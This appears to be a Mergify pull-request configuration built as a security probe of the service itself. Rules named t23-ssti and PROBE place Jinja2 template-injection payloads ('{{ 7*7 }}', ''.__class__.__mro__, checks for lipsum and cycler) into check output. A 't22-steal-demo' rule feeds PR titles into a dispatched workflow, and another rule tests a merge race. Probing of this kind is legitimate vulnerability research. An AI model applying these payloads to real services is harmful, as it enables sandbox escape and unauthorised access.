pull_request_rules:
  - name: t22-steal-demo
    conditions:
      - base=main
      - "author=my-chooice"
    actions:
      github_actions:
        workflow:
          dispatch:
            - workflow: t22-dispatch-sink.yml
              inputs:
                pr_title: "{{ title }}"

  - name: t22-dispatch-probe
    conditions:
      - base=main
      - "label=t22-trigger"
    actions:
      github_actions:
        workflow:
          dispatch:
            - workflow: t22-dispatch-sink.yml
              inputs:
                pr_title: "{{ title }}"


  - name: t15-a-approval-merge
    conditions:
      - "approved-reviews-by>=1"
      - "-draft"
    actions:
      merge:
        method: squash

  - name: t15-label-merge-race
    conditions:
      - "label=merge-race"
      - "-draft"
    actions:
      merge:
        method: squash

  - name: t23-ssti-class
    conditions:
      - base=main
      - "label=t23-class"
    actions:
      post_check:
        title: "T23a:{{ ''.__class__ }}"
        summary: "mro:{{ ''.__class__.__mro__ }}|bases:{{ ''.__class__.__bases__ }}"

  - name: t23-ssti-j2
    conditions:
      - base=main
      - "label=t23-j2"
    actions:
      post_check:
        title: "T23b:lipsum={{ lipsum is defined }}"
        summary: "cycler={{ cycler is defined }}|namespace={{ namespace is defined }}|joiner={{ joiner is defined }}|range={{ range is defined }}"

  - name: t23-ssti-ctx
    conditions:
      - base=main
      - "label=t23-ctx"
    actions:
      post_check:
        title: "T23c:{{ pull_request.__class__.__name__ }}"
        summary: "author={{ author }}|base={{ base }}|number={{ number }}"

  - name: t01-f111-ctrl
    conditions:
      - number > 0
    actions:
      post_check:
        title: "PROBE_T:{{ 7*7 }}"
        summary: "PROBE_S:{{ 7*7 }} / {{ check_rule_name }}"
